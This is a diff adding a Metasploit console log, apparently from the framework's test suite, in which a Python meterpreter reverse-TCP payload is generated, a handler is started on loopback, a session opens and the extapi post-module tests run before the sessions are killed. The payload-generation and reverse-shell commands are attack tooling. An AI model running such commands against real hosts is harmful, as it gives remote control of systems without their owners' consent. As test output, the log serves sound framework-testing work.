@@ -1,0 +1,30 @@
+use python/meterpreter_reverse_tcp
+Stopping all jobs...
+[4mmsf6[0m post([1m[31mtest/railgun[0m) [0m> [4mmsf6[0m payload([1m[31mpython/meterpreter_reverse_tcp[0m) [0m> irb -e '(self.respond_to?(:framework) ? framework : self).datastore.user_defined.clear'
+setg SessionTlvLogging file:/tmp/pythonmeterpreter_reverse_tcp_session_tlv_logging20231026-3229-mrpinwtxt
+[4mmsf6[0m payload([1m[31mpython/meterpreter_reverse_tcp[0m) [0m> SessionTlvLogging => file:/tmp/pythonmeterpreter_reverse_tcp_session_tlv_logging20231026-3229-mrpinwtxt
+generate -o /tmp/child-process-rb-python-meterpreter-reverse-tcp20231026-3229-krukm4.py -f raw AutoVerifySessionTimeout=30 lport=6002 lhost=127.0.0.1 MeterpreterDebugLogging=rpath:/tmp/pythonmeterpreter_reverse_tcp_debug_log20231026-3229-loan5stxt MeterpreterTryToFork=false PythonMeterpreterDebug=true
+[4mmsf6[0m payload([1m[31mpython/meterpreter_reverse_tcp[0m) [0m> [*] Writing 24916 bytes to /tmp/child-process-rb-python-meterpreter-reverse-tcp20231026-3229-krukm4.py...
+[4mmsf6[0m payload([1m[31mpython/meterpreter_reverse_tcp[0m) [0m> to_handler
+[*] Payload Handler Started as Job 1
+[4mmsf6[0m payload([1m[31mpython/meterpreter_reverse_tcp[0m) [0m> 
+[!] You are binding to a loopback address by setting LHOST to 127.0.0.1. Did you want ReverseListenerBindAddress?
+[*] Started reverse TCP handler on 127.0.0.1:6002 
+[*] Meterpreter session 3 opened (127.0.0.1:6002 -> 127.0.0.1:53250) at 2023-10-26 19:02:25 +0000
+use test/extapi
+[4mmsf6[0m post([1m[31mtest/extapi[0m) [0m> run session=3 AddEntropy=true Verbose=true
+[*] Loading extapi extension...
+[*] This module is only available in a windows meterpreter session.
+[*] Running against session 3
+[*] Session type is meterpreter and platform is linux
+[*] SKIPPED: def test_service_management (session platform is not windows)
+[*] SKIPPED: def test_desktop_windows_management (session platform is not windows)
+[*] SKIPPED: def test_clipboard_management (session platform is not windows)
+[*] Testing complete in 0.0 seconds
+[*] Passed: 3; Failed: 0; Skipped: 3
+[*] Post module execution completed
+sessions -K
+[4mmsf6[0m post([1m[31mtest/extapi[0m) [0m> jobs -K
+[*] Killing all sessions...
+[*] 127.0.0.1 - Meterpreter session 3 closed.
+[4mmsf6[0m post([1m[31mtest/extapi[0m) [0m> 
